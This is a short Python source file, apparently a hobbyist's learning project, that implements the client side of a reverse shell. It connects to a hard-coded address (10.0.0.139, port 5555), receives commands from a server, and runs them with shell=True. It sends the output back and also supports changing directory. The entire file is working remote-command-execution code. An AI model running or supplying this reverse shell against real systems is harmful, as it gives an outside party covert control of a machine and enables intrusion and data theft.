#! /usr/bin/env python
"""This is the client script that will run for making the reverse shell
in Python. It is a good way for me to see how sockets work and control
another computer from my Raspberry Pi."""

import socket
import os
import subprocess
import sys

def the_receiver(s):
	"""this function is responsible for receiving system commands from
	the server."""
	while True:
		#cmd_bytes = s.recv(4096)
		cmd = s.recv(4096).decode("utf-8")
		if cmd.startswith("cd "):
			os.chdir(cmd[3:])
			s.send(b"=> ")
			continue
		if len(cmd) > 0:
			the_process = subprocess.run(cmd, shell=True, 
			capture_output=True)
			data = the_process.stdout + the_process.stderr
			s.sendall(data + b"=> ")
def connection():
	"""this function makes the connection with the server
	
	Parameter address: the tuple that has the IP and port to connect
	to the server"""
	try:
		s = socket.socket()
		#host = 'Sirius'
		IP = '10.0.0.139'
		port = 5555
		s.connect((IP, port))
		print("Linux is better than Windows")
	except socket.error as err:
		print("It looks like the connection broke...")
		print(err)
		sys.exit()
	the_receiver(s)
	
if __name__ == "__main__":
	connection()
